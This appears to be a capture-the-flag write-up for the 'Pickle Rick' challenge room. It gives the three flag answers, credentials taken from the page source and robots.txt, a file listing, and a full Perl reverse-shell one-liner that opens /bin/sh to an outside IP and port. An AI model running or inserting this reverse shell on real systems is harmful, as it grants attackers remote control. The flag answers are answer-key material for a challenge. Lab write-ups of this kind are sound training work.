<h1>Pickle Rick</h1>





1. What is the first ingredient Rick needs? <br>
<code>mr. meeseek hair</code>


2. Whats the second ingredient Rick needs? <br>
<code>jerry tear </code>


3. Whats the final ingredient Rick needs? <br>
<code> fleeb juice </code>



Found user name: <code>R1ckRul3s</code> found from the source code of the web page

Found password <code>Wubbalubbadubdub</code> from the robots.txt file</p>



total 32
4 -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
4 drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
4 -rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
4 -rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
4 -rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
4 -rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
4 -rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
4 -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt




Suspicious dir
/.htpasswd // Access denied
// command filter present in the web page

<p> Reverse shell code </p>
<code>perl -e 'use Socket;$i="10.17.5.233";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>
<br>

<p>Privesc:-</p>
No permissions on sudo


